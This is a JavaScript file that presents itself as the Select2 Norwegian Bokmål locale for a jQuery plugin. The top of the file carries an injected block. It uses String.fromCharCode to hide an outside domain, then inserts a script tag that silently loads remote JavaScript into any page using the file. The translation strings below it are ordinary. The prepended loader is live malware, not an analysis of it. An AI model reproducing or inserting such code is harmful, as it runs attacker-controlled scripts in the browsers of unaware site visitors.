var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Norwegian Bokmål translation.
 *
 * Author: Torgeir Veimo <torgeir.veimo@gmail.com>
 * Author: Bjørn Johansen <post@bjornjohansen.no>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['nb'] = {
        formatMatches: function (matches) { if (matches === 1) { return "Ett resultat er tilgjengelig, trykk enter for å velge det."; } return matches + " resultater er tilgjengelig. Bruk piltastene opp og ned for å navigere."; },
        formatNoMatches: function () { return "Ingen treff"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "Vennligst skriv inn " + n + (n>1 ? " flere tegn" : " tegn til"); },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "Vennligst fjern " + n + " tegn"; },
        formatSelectionTooBig: function (limit) { return "Du kan velge maks " + limit + " elementer"; },
        formatLoadMore: function (pageNumber) { return "Laster flere resultater …"; },
        formatSearching: function () { return "Søker …"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['no']);
})(jQuery);

